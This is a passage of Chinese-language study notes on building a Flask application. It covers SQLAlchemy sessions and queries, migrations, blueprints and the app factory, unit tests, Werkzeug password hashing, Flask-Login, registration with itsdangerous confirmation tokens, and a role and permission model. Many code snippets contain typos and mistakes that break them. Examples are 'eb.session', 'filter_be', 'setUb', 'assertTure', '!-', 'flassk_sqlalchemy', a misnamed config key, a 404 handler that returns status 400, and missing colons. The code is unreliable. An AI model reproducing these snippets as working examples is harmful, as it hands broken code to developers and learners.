backref='role')class User(db.Model): # ... role_id = db.Column(db.Integer, db.ForeignKey('roles.id')) 数据库操作创建/删除表1234flask shellfrom hello import dbdb.drop_all()db.create_all() 插入行1234567from hello import Role, Useradmin_role = Role(name='Admin')mod_role = Role(name='Moderator')user_role = Role(name='User')user_john = User(username='john', role=admin_role)user_susan = User(username='susan', role=user_role)user_david = User(username='david', role=user_role) 模型的构造函数接受的参数是使用关键字参数指定的模型属性初始值。role属性也可以使用，这是一对多关系的高级表示。新建对象是没有明确设定id属性，大多数数据库的主键由数据库自身管理。目前这些对象只存在于python中，没有写入数据库，所以id为None。 对数据库的改动通过数据库会话管理，在Flask-SQLAlchemy中，会话由db.session表示，准备把对象写入数据库之前，要首先将其添加到会话中。 123456db.session.add(admin_role)db.session.add(mod_role)db.session.add(user_role)eb.session.add(user_john)db.session.add(user_susan)db.session.add(user_david) 或者可以简写为 1db.session.add_all([admin_role, mod_role, user_role, user_john, user_susan, user_david]) 为了把对象写入数据库，需要调用commit方法提交会话： 1db.session.commit() 数据库会话能保证数据的以执行，提交操作如果在写入会话的过程中发生了错误，整个会话都会失败，数据库会话也可以回滚，调用db.session.rollback()后，添加到数据库会话中的所有对象都将还原到它在数据库中的状态。 修改行在数据会话上调用add方法也能更新模型，把Admin角色重命名为Administrator： 123admin_role.name = 'Administrator'db.session.add(admin_role)db.session.commit 删除行12db.session.delete(mod_role)db.session.commit() 查询行Flask-Alchemy为每个模型类提供了query对象，最基本的模型查询使用all方法取回所有记录： 1234Role.query.all()# [&lt;Role 'Administrator'&gt;, &lt;Role 'User'&gt;]User.query.all()# [&lt;User 'john'&gt;, &lt;User 'susan'&gt;, &lt;User 'david'&gt;] 使用过滤器可以配置query对象以进行更精准的查询，查找角色为User的用户： 12User.query.filter_by(role=user_role).all()# [&lt;User 'susan'&gt;, &lt;User 'david'&gt;] 如果要查看SQLALlchemy为查询生成的SQL查询语句，只需要把query对象转换为字符串： 12str(User.query.filter_be(role=user_role))'SELECT users.id AS users_id, users.username AS users_username, users.role_id AS users_role_id \\nFROM Users \\nWHERE :param_1 = users.role_id' r如果推出了shell会话，前面这些例子中创建的对象不会以python对象的形式存在，但在数据库中仍有相应的行。可以从数据库读取行，重新创建Python对象，如加载名为User的user_role： 1user_role = Role.query.filter_by(name='User').first() first方法返回第一个结果，如果没有则返回None。 filter_by等过滤器在query对象上调用，返回一个过滤后的query对象。 关系与查询的处理方式类似，下面这个例子分别从关系的两端查询用户和角色的一对多关系 12345users = user_role.usersusers# [&lt;User 'susan'&gt;, &lt;User 'david'&gt;users[0].role# &lt;Role 'User'&gt; 有个小问题，执行user_role.user时会隐式调用all()方法，返回一个列表，此时query对象时隐藏的，无法指定过滤器。可以加入lazy='dynamic'参数，禁止自动查询。 1234class Role(db.Model): #... users = db.realationship('User', backref='role', lazy='dynamic') # ... 这样user.role.users会返回一个query对象，可以添加过滤器。 在视图函数中操作数据库前一节的数据库操作可以直接在视图函数中进行，把用户输入的名字记录到数据库中（hello.py）： 12345678910111213141516@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit() user = User.query.filter_by(username=form.name.data).first() if user is None: user = User(username=form.name.data) db.session.add(user) db.session.commit() session['known'] = False else: session['known'] = True session['name'] = form.name.data form.name.data = '' return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name'), known=session.get('known', False)) 为了正常运行，需要先在shell中创建数据库表。通过knowns可以对已知用户和新用户显示不同的内容（templates/index.html）： 1234567891011121314{% extends &quot;base.html&quot; %}{% import &quot;bootstrap/wtf.html&quot; as wtf %}{% block title %}Flasky{% endblock %}{% block page_content %}&lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Hello, {% if name %}{{ name }}{% else %}Stranger{% endif %}&lt;/h1&gt; {% if not known %} &lt;p&gt;Pleased to meet you!&lt;/p&gt; {% else %} &lt;p&gt;Happy to see you again!&lt;/p&gt; {% endif %}&lt;/div&gt;{{ wtf.quick_form(form) }}{% endblock %} 集成python shell每次启动会话都要导入数据库实例和模型，可以通过配置让flask shell命令自动导入这些对象。若想把对象添加到导入列表，必须使用app.shell_context_processor装饰器创建并注册一个shell上下文管理器： 123@app.shell_context_processordef make_shell_context(): return dict(db=db, User=User, Role=Role) 这个shell上下文处理器函数返回一个字典，包含数据库实例和模型，除了默认导入的app以外，flask shell命令将自动吧这些对象导入shell。 使用Flask-Migrate实现数据库迁移开发过程中，有时需要修改数据库模型，而且修改之后要更新数据库。当数据库表不存在时，Flask-SQLAlchemy才会根据模型创建。因此，更新表需要删除旧表，但是会丢失所有数据。 更好的方法是使用数据库迁移框架，它可以追踪数据库模式的变化，然后以增量方式把变化应用到数据库中。SQLAlchemy开发人员编写了一个迁移框架名为Alembic，Flask由Flask-Migrate扩展。 创建迁移仓库先安装Flask-Migrate，pip install flask-migrate 初始化： 1234from flask_migrate import Migrate# ...migrate = Migrate(app.db) Flask-Migrate添加了 flask db命令和几个子命令，新项目中可以使用init子命令添加迁移支持 1flask db init 这会创建 migrations 目录，所有迁移脚本存放在这里。 电子邮件Flask-Mail插件提供电子邮件支持，需要时查阅。 大型应用的结构Flask 并不强制开发者使用特定方式组织大型应用，以下介绍一种用包和模块组织大型应用的方式。 项目结构1234567891011121314151617181920|-flasky/ |-app/ |-templates/ |-static/ |-main/ |-__init__.py |-errors.py |-forms.py |-views.py |-__init__.py |-email.py |-models.py |-migrations/ |-tests/ |-__init__.py |-test*.py |-venv/ |-requirements.txt |-config.py |-flasky.py 说明： app/ 保存Flask 应用 migrations/ 保存数据库迁移脚本 test/ 单元测试 venv/ Python虚拟环境 requirements.txt 列出所有依赖包，便于在其他计算机中重新生成i昂同的虚拟环境 config.py 存储配置 flasky.py 定义Flask应用实例，辅助管理应用 配置选项除去之前 hello.py 中类似字典的 app.config对象之外，可以使用具有层次结构的配置类。config.py： 1234567891011121314151617181920212223242526272829303132333435363738394041import osbasedir = os.path.abspath(os.path.dirname(__file__))class Config: SECRET_KEY = os.environ.get('SECRET_KEY') or 'hard to guess string' MAIL_SERVER = os.environ.get('MAIL_SERVER', 'smtp.googlemail.com') MAIL_PORT = int(os.environ.get('MAIL_PORT', '587')) MAIL_USE_TLE = os.environ.get('MAIL_USE_TLS', 'tls').lower() in ['true', 'on', '1'] MAIL_USERNAME = os.environ.get('MAIL_USERNAME') MAIL_PASSWORD = os.environ.get('MAIL_PASSWORD') FLASKY_MAIL_SUBJECT_PREFIX = '[flasky]' FLASKY_MAIL_SENDER = 'Flasky Admin &lt;flasky@example.com&gt;' FLASKY_ADMIN = os.environ.get('FLASKY_ADMIN') SQLALCHEMY_TRACK_MODIFICATIONS = False @staticmethod def init_app(app): passclass DevelpmentConfig(Config): DEBUG = True SQLALCHEMY_DATABASE_URI = os.environ.get('DEV_DATABASE_URL') or 'sqlite:///' + os.path.join(basedir, 'data-dev.sqlite')class TestingConfig(Config): TESTING = True SQLALCHEMY_DATABASE_URI = os.environ.get('TEST_DAATABASE_URL') or 'sqlite://'class ProductionConfig(Config): SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URI') or 'sqlite://' + os.path.join(basedir, 'data.sqlite')config = { 'development': DevelopmentConfig, 'tessting': TestingConfig, 'production': ProductionConfig, 'default': DeevelopmentConfig} 基类Config 包含通用配置，各个子类分别定义专用的配置。为了灵活和安全，多数配置都可以从环境变量中导入。千万不能把敏感信息写在纳入版本控制系统的配置文件中。Config及其子类可以定义 init_app()方法，其参数为应用实例。 应用包应用包用于夫南方应用的所有代码，模板和静态文件，我们可以直接把这个包成为 app，也可以使用一个专属名称。templates 和 static 目录现在是应用包的一部分，数据库模型和电子邮件支持函数也要放到这个包中。 使用应用工厂函数在单个文件开发应用有个很大的缺点：应用在全局作用域中创建，无法动态修改配置。解决办法是延迟创建实例，把创建过程移到可显式调用的 工厂函数中。不仅可以给脚本留出配置应用的时间，还能够创建多个应用实例，方便测试。工厂函数在 app 包的构造文件中定义。app/__init__.py： 12345678910111213141516171819202122232425from flask import Flask, render_templatefrom flask_botstrap import Bootstrapfrom flask_mail import Mailfrom flask_moment import Momentfrom flassk_sqlalchemy import SQLAlchemyfrom config import configbootstrap = Bootstrap()mail = Mail()moment = Moment()db = SQLAlchemy()def create_app(config_name): app = Flask(__name__) app.config.from_object(config[onfig_name]) config[config_name].init_app(app) bootstrap.init_app(app) mail.init__app(app) moment.init_app(app) db.init_app(app) # 添加路由和自定义错误页面 return app 构造文件导入了大多数正在使用的Flask扩展，由于尚未初始化所需的应用实例，所以创建扩展类时没有向构造函数传入参数，因此扩展并未初始化。create_app()时应用的工厂函数，接受一个参数，应用使用的配置名。配置类在 config.py 中定义。其中定义的配置可以使用app.config提供的from_object 方法直接导入应用。应用创建并且配置完成后就可以初始化扩展，在之前创建的对象上调用init_app()完成初始化，可以实现更复杂的初始化。 这个工厂函数创建的应用还不完整，因为没有路由和自定义的错误页面处理程序。 在蓝本中实现应用功能转换成工厂函数让定义路由变得复杂了。在单脚本应用中，应用实例存在于全局变量作用域，路由可以直接使用app.route装饰器定义。但现在应用在运行时创建，只有调用 create_app 之后才能使用 app.route 装饰器，这是定义路由就太晚了。自定义的错误页面同理。 Flask使用蓝本 blueprint 提供了解决办法。蓝本与应用类似，可以定义路由和错误处理程序，不同的是，蓝本中定义的路由和错误处理程序处于休眠状态，知道蓝本注册到应用上之后，他们才真正成为应用的一部分。使用位于全局作用域中的蓝本时，定义路由和错误处理程序的方法几乎与但脚本应用一样。 蓝本可以在单个文件中定义，也可以使用更结构化的方式在包中的多个模块中创建。为了获得灵活性，我们在应用包中创建一个子包，用于保存应用的第一个蓝本。app/main/__init__.py： 12345from flask import Bluprintmain = Blueprint('main', __name__)from . import views, errors 蓝本通过实例化一个Blueprint类对象，这个构造函数有两个必须指定的参数，蓝本名称和蓝本所在的包或模块。与应用一样，第二个参数一般使用__name__。 应用的路由保存在在 app/main/views.py 中，错误处理保存在 app/main/errors.py 中，导入这两个模块就能把路由和错误处理程序与蓝本关联起来。导入在末尾进行时为了防止循环导入依赖，因为在 view 和 errors 中还要导入 main 蓝本。 蓝本在工厂函数create_app()中注册到应用上，app/__init__.py： 12345def create_app(config_name): from .main import main as main_blueprint app.register_blueprint(main_blueprint) return app 错误处理程序，app/main/errors.py： 12345678910from flask import render_templatefrom . import main@main.app_errorhandler(404): def page_not_found(e): return render_template('404.html'),400 @main.app_errorhandler(500): def internal_server_error(e): return render_template('500.html'),500 在蓝本中编写错误处理程序稍有不同，如果使用errorhandler装饰器，则只有蓝本中的错误才能触发，要想注册应用全局的错误处理程序，必须使用 app_errorhandler装饰器。 在蓝本中定义路由，app/main/views.py： 1234567891011121314from datetime import datetimefrom flask import render_template, session, redirect, url_forfrom . impot mainfrom .forms import NameFromfrom .. import dbfrom ..models import User@main.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): # ... return redirect(url_for('main.index')) return render_template('index.html', form=form, message=session.get('name'), known=session.get('known', False), current_time=datetime.utcnow()) 在脚本中编写视图函数主要有两点不同：第一，与前面的错误处理程序一样，路由装饰器由蓝本提供，因此使用的是main.route，而非app.route；第二，url_for 函数的用法不同，在蓝本中，Flask会为所有蓝本中的端点加上一个命名空间，这样就可以在不同的蓝本中使用相同的端点名定义视图函数而不产生冲突。命名空间是蓝本的名称，即 Blueprint 构造函数的第一个参数，而且它与端点名之间以一个 . 分割。因此视图函数 index 注册的端点名为 main.index, url使用 url_for('main.index')获取。蓝本中，url_for可以使用省略形式，省略蓝本名，url_for('.index')。 需要引入表单对象，保存在app/main/forms.py。 应用脚本应用实例在顶级目录的 flasky.py 中定义。flasky.py： 1234567891011import osfrom app import create_app, dbfrom app.modules import User, Rolefrom flask_migrate import Migrateapp = create_app(os.getenv('FLASK_CONFIG') or 'defalt')migrate = Migrate(app, db)@app.shell_context_processordef make_shell_context(): return dict(db=db, User=User, Role=Role) 这个脚本创建应用实例，读取环境变量，初始化 Flask-Migrate 为Python shell 定义上下文。 设置环境变量： 12export FLASK_APP=flasky.pyexport FLASK_DEBUG=1 需求文件requirements.txt文件用于记录所有依赖包及其版本号，可以在另一台计算机上重新恒诚虚拟环境。 生成：pip freeze &gt; requirements.txt 还原：pip install -r requiirements.txt 单元测试简单的两个测试，tests/test_basics.py： 123456789101112131415161718192021import unittestfrom flask import current_appfrom app import create_app, dbclass BasicsTestCase(unittest.Testcase): def setUb(self): self.app = create_app('testing') self.app_context = self.app.app_context self.app_context.push() db.create_all() def tearDown(self): db.session.remove() db.drop_all() self.app_context.pop() def test_app_exitsts(self): self.assertFalse(current_app is None) def test_app_is_testing(self): self.assertTure(current_app.config['TESTING']) 使用 unittest 包编写，测试用例类的 setUp 和 tearDown 方法分别在各测试之前和之后运行，名称以test_开头的方法都作为测试运行。 setUp方法尝试创建一个测试环境，尽量与正常运行应用所需的环境已知。首先使用测试配置创建应用，然后激活上下文，保证在测试中能够使用 current_app，然后使用create_all创建一个全新的数据库库，数据库和应用上下文在 tearDown中删除。第一个测试确保应用实例存在，第二个确保应用在测试环境中运行。 为了执行单元测试，可以在flasky.py中添加一个自定义命令。flasky.py 123456@app.cli.command()def test(): &quot;&quot;&quot;Run unit tests.&quot;&quot;&quot; import unittest tests = unittest.TestLoader().discover('tests') unittest.TextTestRunner(verbosity=2).run(tests) app.cli.command装饰器把被装饰的函数名当作命令，调用 unittest包中提供的测试运行程序。使用flask test运行。 创建数据库运行应用实例：社交博客应用用户身份认证Flask 有很多身份验证包，这里的方案使用了多个包，通过编写胶水代码让不同的包写作。使用的包：Flask-Login 管理以登录用户的用户会话；Werkzeug 计算密码散列值并进行核对；itsdangerous 生成并核对加密安全令牌。 除了身份验证外，还将用到的扩展：Flask-Mai；Flask-Bootstrap；Flask-WTF。 密码安全性使用Werkzeug计算密码散列值Werkzeug 中的security模块实现了密码散列值的计算，这一功能的实现只需要两个函数，分别在注册和核对两个阶段。generate_password_hash(password, method='pbkdf2:sha256', salt_length=8)，这个函数的输入为原始密码，返回散列的字符串形式供存入数据库。method和salt_length多数情况下可以使用默认值。check_password_hash(hash, password)这个函数的参数是从数据库取回的密码散列值和用户输入的密码，返回True时表示密码正确。 在之前创建的User模型基础上加入密码散列的改动，app/models.py： 12345678910111213141516from werkzeug.security import generate_password_hash, check_password_hashclass User(db.Model): # ... password_hash = db.Column(db.String(128)) @property def password(self): raise AttributeError('password is not a readable attribute') @password.setter def password(self, password): self.password_hash = generate_password_hash(password) def verify_password(self, password): return check_password_hash(self.password_hash, password) 添加单元测试，测试最近的改动。test/test_user_model.py： 12345678910111213141516171819import unittestfrom app.models import Userclass UserModelTestCase(unittest.TestCase): def test_password_setter(self): u = User(password = 'cat') self.assertTrue(u.password_hash is not None) def test_no_password_getter(self): u = User(password = 'cat') with self.assertRaises(AtrributeError): u.password def test_password_verification(self): u = User(password = 'cat') self.assertTrue(u.verify_password('cat')) self.assertFalse(u.verify_password('dog')) def test_password_aslts_are_random(self): u = User(password='cat') u2 = User(password='cat') self.assertTrue(u.password_hash !- u2.password_hash) 创建身份验证蓝本使用一个名为 auth 的蓝本验证身份，保存在同名python包中。这个蓝本的包构造函数创建蓝本对象，再从views.py模块中导入路由。app/auth/__imit__.py： 1234from flask import Blueprintauto = Blueprint('auth', __name__)from . import views views.py 导入蓝本，然后使用蓝本的route 装饰器定义身份与验证相关的路由。这里添加了/login路由，app/auth/views.py： 123456from flask import render_templatefrom . import auth@auth.route('/login'): def login(): return render_template('auth/login.html') auth 蓝本要在 create_app 工厂函数中附加到应用上，app/__init__.py： 12345def create_app(config_name): # ... from .auth import auth as auth_blueprint app.register_blueprint(auth_blueprint, url_prefix='/auth') return app 注册蓝本使用的url_prefix时可选参数，注册后蓝本定义的所有路由会加上指定的前缀。例如/lgoin会注册成/auth/login。 使用 Flask-Login 验证身份登录后，用户的验证状态要记录在用户会话中。Flask-Login 用于管理用户身份验证系统中的验证状态，不依赖特定的身份验证机制。pip install flask-login 准备用于登录的用户模型Flask-Login的运行需要应用中有 User对象，User模型必须实现几个属性和方法： 属性/方法 说明 is_suthenticated 如果用户提供的登录凭据有效则返回True is_active 如果允许用户登录，返回True；如果想禁用用户，可以返回False is_anonymous 对普通用户返回False，对匿名用户返回True get_id() 返回用户的唯一标识符，使用Unicode编码字符串 这些属性和方法可以在模型类中实现，但是Flask-Login提供了UserMixin类，包含了默认实现，能满足多数需求，修改用户模型，app/models.py: 123456789from flask_login import UserMixinclass User(UserMixin, db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) email = db.Column(db.String(64), unique=True, index=True) username = db.Column(db.String(64), unique = True) password_hash = db.Column(db.String(128)) role_id = db.Column(db.Integer, db.ForeignKey('roles.id')) 这个示例中，用户使用电子邮件登录。 Flask-Login在应用的工厂函数中初始化，app/__init__.py： 123456789from flask_login import LoginManagerlogin_manager = LoginManager()login_manager.login_view = 'auth.login'def create_app(config_name): #... login_manager.init_app(app) #... LoginManager 对象的 login_view 属性用于设置登陆页面的端点。匿名用户尝试访问受保护的页面时，Flask-Login将重定向到登陆页面，因为登陆路由在蓝本中定义，所以需要加上蓝本的名称。 Flask-Login 要求应用指定一个函数，在扩展需要从数据库中获取指定标识符对应的用户时调用，app/models.py： 12345from . import login_manager@login_manager.user_loaderdef load_user(user_id): return User.query.get(int(user_id)) login_manager.user_loader 装饰器把这个函数注册给 Flask-Login，在这个扩展需要获取一登陆用户的信息时调用，传入的用户标识符是一个字符串，因此这个函数先把标识符转换成整数，然后传给 Flask-SQLAlchemy 查询，加载用户。正常情况下这个返回值是用户对象，如果失败返回None。 保护路由为了保护路由，只让通过身份验证的用户访问，Flask-Login提供了一个login_required 装饰器，可以使用多个装饰器，各装饰器只对随后的装饰器和目标函数起作用。以下例子中，两个装饰器不能对调位置： 123456from flask_login import login_required@app.route('/secret')@login_requireddef secret(): pass 添加登录表单呈现给用户的登录表单中包含一个用于输入电子邮件地址的文本字段，一个密码字段，一个 记住我 复选框和一个提交按钮，使用Flask-WTF类，/app/auth/forms.py： 123456789from flask_wtf import FlaskFormfrom wtforms import StringField, PasswordField, BoolenField, SubmitFieldfrom wtforms.validators import DataRequired, Length, Emailclass LoginForm(FlaskForm): email = StringField('Email', validators=[DataRequired(), Length(1,64), Email()]) password = PasswordField('Password', validators=[DataRequired()]) remember_me = BooleanField('Keep me logged in') submit = SubmitField('Log In') PasswordField 类表示属性为 type=”password” 的 input 元素，BooleanField类表示复选框。电子邮件字段用到了Length，Email，和DataRequired三个验证函数。登录页面使用的模板保存在 auth/login.html中，只需使用Flask-Bootstrap提供的 wtf.quick_form 宏渲染表单即可。base.html中的导航栏可以使用Jinja2条件语句判断当前用户的登陆状态，分别显示 Log In 或 Log out 链接，app/templates/base.html： 1234567&lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; {% if current_user.is_authenticated %} &lt;li&gt;&lt;a href=&quot;{{ url_for('auth.logout') }}&quot;&gt;Log Out&lt;/a&gt;&lt;/li&gt; {% else %} &lt;li&gt;&lt;a href=&quot;{{ url_for('auth.login') }}&quot;&gt;Log In&lt;/a&gt;&lt;/li&gt; {% endif %}&lt;/ul&gt; 判断条件中的变量 current_user 由Flask-Login定义，在视图函数和模板中自动可用，这个变量的值是当前登录的用户，如果未登录则是一个匿名用户代理对象，它的 isauthenticated 属性是False，，所以可以判断用户是否登录。 登入用户实现 login，app/auth/views.py： 12345678910111213141516171819from flask import render_template, redirect, request, url_for, flaskfrom flask_login import login_userfrom . import authfrom ..models import Userfrom .forms import LoginForm@auth.route('/login', methods=['GET', 'POST'])def login(): form = LoginFOrm() if form.validate_on_submit(): user = User.query.filter_by(email=form.email.data).first() if user is not None and user.verify_password(form.password.data) login_user(user, form.remember_me.data) next = request.args.get('next') if next is None or not next.startswith('/'): next = url_for('main.index') return redirect(next) flash('Invalid username or password.') return render_template('auth/login.html', form=form) 修改后的模板，app/templates/auth/login.html： 1234567891011{% extends &quot;base.html&quot; %}{% import &quot;bootstrap/wtf.html&quot; as wtf %}{% block title %}Flasky - Login{% endblock %}{% block page_content %}&lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Login&lt;/h1&gt;&lt;/div&gt;&lt;div class=&quot;col-md-4&quot;&gt; {{ wtf.quick_form(form) }}&lt;/div&gt;{% endblock %} 登出用户退出路由的实现，app/auth/views.py： 12345678from flask_login import logout_user, login_required@auth.route('/logout')@login_requireddef loggout(): logout_user() flash('You have benn logged gout.') return redirect(url_for('main.index')) 理解 Flask-Login 的运作方式用户登录过程涉及的操作： 点击 Log In 链接，访问 /auth/login，处理这个URL的函数返回登陆表单模板。 用户输入用户名和密码，点击提交，调用相同的处理函数，但这一次是POST请求。处理函数会验证表单提交的凭据，调用Flask-Login的 login_user函数，登入用户。login_user函数把用户ID以字符串形式写入用户会话。视图函数重定向到首页。 浏览器收到重定向，请求首页。调用首页的视图函数，渲染模板，出现对 current_user的引用。这个请求没有给上下文变量 current_user 赋值，因此调用Flask-Login内部的 _get_user函数，找出用户是谁。_get_user检查用户会话中有没有用户ID，如果没有，返回一个Flask-Login的 AnonymousUser实例，如果由，调用应用中使用 user_load 装饰器注册的函数，传入用户ID。应用中的 user_ loader 从数据库中读取用户并返回。Flask-login把它赋值给当前请求的 current_user上下文变量。模板接收它。 使用 login_required 装饰器装饰的试图函数将使用 current_user 上下文变量判断 current_user.is_authenticated 表达式是否为 True 。logout_user 函数比较简单，直接从用户会话中删除用户ID。 登录测试为验证登录功能可用，可以更新首页，使用已登录用户的名字显示一个欢迎信息。app/templates/index.html： 123456Hello,{% if current_user.is_autenticated %} {{ current_user.username }}{% else %} Stranger{% endif %}! 因为未实现注册功能，目前只能在shell中注册新用户。 1234flask shellu = User(email='john@example.com', username='john', password='cat')db.session.add(u)db.session.commit() 访问首页可以看到结果 注册新用户如果新用户想成为应用的成员，必须在应用中注册。这样应用才能识别并登入用户。登录页面要显示一个注册页面的链接，让用户输入电子邮件地址，用户名和密码。 添加用户注册表单app/auth/forms.py： 12345678910111213141516171819from flask_wtf import FlaskFormfrom wtforms import StringField, PasswordField, BooleanField, SubmitFieldfrom wtforms import ValidationErrorfrom ..models import Userclass RegistrationForm(FlaskForm): email = StringField('Email', validators=[DataRequired(), Length(1,64), Email()]) username = StringField('Username', validators=[DataRequired(), Length(1,64), Regexp('^[A-Za-z][A-Za-z0-9]*$', 0, 'Username must have only letters, numbers, dots or ' 'underscores')]) password = PasswordField('Password', validators=[DataRequired(), EqualTo('password2', message='Password must math.')]) password2 = PasswordField('Confirm password', validators=[DataRequired()]) submit = SubmitField('Register') def validate_email(self, field): if User.query.filter_by(email=field.data).first() raise ValidationError('Email already registered.') def validate_username(self, field): if User.query.filter_by(username=field.data).first(): raise ValidatioinError('Username already in use.') 这个表单使用WTForms提供的Regexp验证函数，后面两个参数分别是正则表达式标志和验证失败显示的错误信息。EqualTo验证函数检查两个字段是否一致，输入为另一个字段。还含有两个自定义验证函数，以方法方式实现。如果表单定义了validate_开头并且后面跟着字段名的方法，这个方法就和常规的验证函数一起使用。这里为email 和 username 定义了验证函数，确保数据库中没有出现过。自定义验证函数表示验证失败可以跑出 ValidationError 异常，参数是错误信息。 显示这个表单的模板是 app/templates/auth/register.html，使用wtf.quick_form渲染表单，登录页面要显示一个指向注册页面的链接，app/templates/auth/login.html： 123456&lt;p&gt; New user? &lt;a href=&quot;{{ url_for('auth.register') }}&quot;&gt; Click here to register &lt;/a&gt;&lt;/p&gt; 注册新用户app/auth/views.py： 12345678910@auth.route('/register', methods=['GET', 'POST'])def register(): form = RegistrationForm() if form.validate_on_submit(): user = User(email=form.email.data, username=form.username.data, password=form.password.data) db.session.add(User) db.session.commit() flash('You can now login.') return redirect(url_for('auth_login'))return render_template('auth/register.html', form=form) 确认账户有时需要确认用户提供的信息是否正确，常见于检查电子邮件地址。通过向提供的邮箱发送确认邮件，要求用户点击一个包含确认令牌的特殊URL可以确认。 使用 itsdangerous 生成确认令牌123456789flask shellfrom itsdangerous import TimedJSONWebSignatureSerialize as Serializers = Serializer(app.config['SECRET_KEY'], expires_in=3600)token = s.dumps({'confirm': 23})token# evJh........data = s.loads(token)data# {'confirm': 23} itsdangerous 提供多种生成令牌的方法，其中 TimedJSONWebSignatureSerializer 正常具有过期时间的 JSON Web签名（JWS），构造函数接受的参数是一个密钥，可以使用 SECRET_KEY 设置。 dumps 方法为指定的数据生成一个加密签名，然后对数据和签名进行序列化，生成令牌字符串。expires_in参数设置过期时间，单位是秒。 loads 方法解码令牌，参数是令牌字符串，检验签名和过期时间。如果都有效，返回原始数据，否则抛出异常。这个功能可以添加到User模型中。app/models.py： 123456789101112131415161718192021from itsdangerous import TimedJSONWebSignatureSerializer as Serializerfrom flask import current_appfrom . import dbclass User(UserMixin, db.Model): # ... confirmed = db.Column(db.Boolean, default=False) def generate_confirmation_token(self, expiration=3600): s = Serializer(current_app.config['SECRET_KEY'], expiration) return s.dumps({'confirm': self.id}).decode('utf-8') def confirm(self, token): s = Serializer(current_app.config['SECRET_KEY']) try: data = s.loads(token.encode('utf-8')) except: return False if data.get('confirm') != self.id return False self.confirmed = True db.session.add(self) return True 发送确认邮件当前的/register路由把新用户添加到数据库中之后会重定向到/index，在这之前需要发送确认邮件，app/auth/views.py： 123456789101112from ..email import send_email@app.route('/register', methods=['GET', 'POST'])def register(): form = RegistrationForm() if form.validate_on_submit(): # ... db.session.add(User) db.session.conmmit() token = user.generate_cofirmation_token() send_email(user.email, 'Confirm Your Account', 'auth/email/confirm', user=user, token=token) flash('A confirmation email has been sent to your') 身份验证蓝本使用的电子邮件模板保存在 templates/auth/email 目录中，以便与HTML模板区分。一个电子邮件需要两个模板，分别用于渲染纯文本正文和HTML正文。例如以下纯文本模板，app/templates/auth/email/confirm.txt： 1234Dear {{ user.username }}Welcome to Flasky!To confirm your account please click on the following link:{{ url_for('auth.confirm', token=token, _external=True) }} 确认账户的视图函数，app/auth/views.py： 12345678910111213from flask_login import current_user@auth.route('/confirm/&lt;token&gt;'):@login_requireddef confirm(token): if current_user.confirmed: return redirect(url_for('main.index')) if current_user.confirm(token): db.session.commit() flash('You have confirmed your account.') else: flash('The confirmation link is invalid or has expired.') return redirect(url_for('main.index')) 由于令牌确认完全在User模型中完成，因此视图函数只需要调用 confirm 方法即可，再根据确认结果显示不同的信息。确认成功后，User模型中 confirmed属性的值会修改并添加到会话中，然后提交数据库会话。 各个应用可以自行决定用户确认账户之前可以做哪些操作，比如允许未经确认的用户登录，但只显示一个界面，要求访问之前确认账户。这一步可以通过 Flask 提供的 before_request 钩子完成，对于蓝本来说，before_request 钩子只能应用到属于蓝本的请求上。如果想在蓝本中使用针对应用全局请求的钩子，必须使用 before_app_request装饰器。app/auth/views.py： 12345678910111213@auth.before_app_requestdef before_request(): if current_user.is_authenticated \\ and not current_user.confirmed \\ and request.blueprint != 'auth' \\ and request.endpoint != 'static': return redirect(url_for('auth.unconfirmed'))@auth.route('/unconfirmed')def unconfirmed(): if current_user.is_anonymous or current_user.confirmed: return redirect(url_for('main.index')) return render_template('auth/confirmed.html') 用户已登录，未确认并且请求的URL不在身份验证蓝本中，不是对静态文件的请求，要赋予用户访问路由的权限时，before_app_request 会拦截请求，重定向到auth/unconfirmed。 重新发送账户确认邮件，app/auth/views.py： 12345678@auth.route('/confirm')@login_requireddef resend_confirmation(): token = current_user.generate_confirmation_token() send_email(current_user.email, 'Confirm Your Account', 'auth/email/confirm', user=current_user, token=token) flash('A new confirmation email has been sent to you.') return redirect(url_for('main.index')) 管理账户拥有应用账户的用户有时可能需要修改账户信息，也可添加功能。 用户角色实现方式结合了分立的角色和权限，赋予用户分立的角色，但是哥哥角色都通过权限列表定义允许用户执行的操作。 角色在数据库中的表示改进后的Role模型，app/models.py： 123456789101112class Role(db.Model): __tablename__ = 'roles' id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64), unique=True) default = db.Column(db.Boolean, default=False, index=True) permissions = db.Column(db.Integer) users = db.reationship('User', backref='role', lazy='dynamic') def __init__(self, **kwargs): super(Role, self).__init__(**kwargs) if self.permissions is None: self.permissions = 0 这里新增了 default 字段，这是注册新用户时赋予的角色，只能有一个角色的这个字段为 True，因为应用在 roles 表中搜索默认角色，因此设置了索引。另一处改动是增加了 permissions 字段，SQLAlchemy 默认把这个字段的值设为None，因此添加了一个类构造函数，默认把 permissions设置为0。各操作所需的权限在不同的应用中是不一样的，定义权限： 操作 权限名 权限值 关注用户 FOLLOW 1 在他人的文章中发表评论 COMMENT 2 写文章 WRITE 4 管理他人发表的评论 MODERATE 8 管理员权限 ADMIN 16 使用2的幂表示权限可以方便的组合权限。app/models.py： 12345678910111213141516171819class Permission: FOLLOW = 1 COMMENT = 2 WRITE = 4 MODERATE = 8 ADMIN = 16class Role(db.Model): # ... def add_permission(self, perm): if not self.hash_permission(perm): self.permissions += perm def remove_permission(self, perm): if self.has_permission(perm): self.permissions -= perm def reset_permissions(self): self.permissions = 0 def has_permission(self, perm): return self.permissions &amp; perm == perm 用户角色和权限组合的定义： 用户角色 权限 说明 匿名 无 未登录用户 用户 FOLLOW, COMMENT, WRITE 新用户默认角色 协管员 FOLLOW, COMMENT, WRITE, MODERATE 增加管理其他用户评论的权限 管理员 FOLLOW, COMMENT, WRITE, MODERATE, ADMIN 具有所有权限，包括修改其他用户所属角色 可以在Role类中添加一个类方法，将角色添加到数据库。既方便测试，也方便部署到生产环境。app/models.py 1234567891011121314151617181920class Role(db.Model): # . @staticmethod def insert_roles(): roles = { 'User': [Permission.FOLLOW, Permission.COMMENT, Permission.WRITE], 'Moderator': [Permission.FOLLOW, Permission.COMMENT, Permission.WRITE, Permission.MODERATE], 'Administrator': [Permission.FOLLOW, Permission.COMMENT, Permission.WRITE, 